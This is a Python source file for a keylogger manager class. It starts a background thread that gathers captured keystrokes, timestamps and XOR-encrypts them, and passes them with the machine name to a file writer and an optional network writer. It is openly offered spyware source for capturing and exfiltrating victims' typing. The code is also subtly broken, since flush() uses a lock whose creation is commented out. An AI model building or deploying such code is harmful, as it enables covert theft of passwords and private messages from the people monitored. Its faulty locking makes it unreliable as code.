from datetime import datetime
import time
import threading



class KeyLoggerManager:
    def __init__(self, keylogger_service, file_writer, encryption, machine_name, network_writer= None, interval = 5):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.encryption = encryption
        self.network_writer = network_writer
        self.interval = interval
        self.machine_name = machine_name

        self.buffer = []
        self.running = False
        self.thread = None
        # self.lock = threading.Lock()

    def start(self):
        if self.running:
            return
        self.running = True
        self.keylogger_service.start_logging()
        self.thread = threading.Thread(target=self._collect_data, name="keyloggerManagerThread", daemon=True)
        self.thread.start()
        print("[KeyLoggerManager] Started background collection loop")

    def stop(self):
        if not self.running:
            return
        self.running = False
        self.keylogger_service.stop_logging()
        if self.thread:
            self.thread.join()
            self.thread = None
        self.flush()
        print("[KeyLoggerManager] Stopped and flushed remaining data.")

    def flush(self):
        with self.lock:
            has_data = bool(self.buffer)
        if has_data:
            self._process_and_send()

    def _collect_data(self):
        while self.running:
            try:
                keys = self.keylogger_service.get_logging_keys()
                if keys:
                    self.buffer.extend(keys)

                if self.buffer:
                    self._process_and_send()
                time.sleep(self.interval)
            except Exception as e:
                print(f"[KeyLoggerManager] Error while collecting data: {e}")


    def _process_and_send(self):
        try:
            raw_data = "".join(self.buffer)
            self.buffer.clear()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            line_to_process = f"[{timestamp}] {raw_data}"

            encrypted_data = self.encryption.xor_encrypt(line_to_process)

            self.file_writer.send_data(encrypted_data, self.machine_name)

            if self.network_writer:
                self.network_writer.send_data(encrypted_data, self.machine_name)
        except Exception as e:
            print(f"[KeyLoggerManager] Error while processing and sending data: {e}")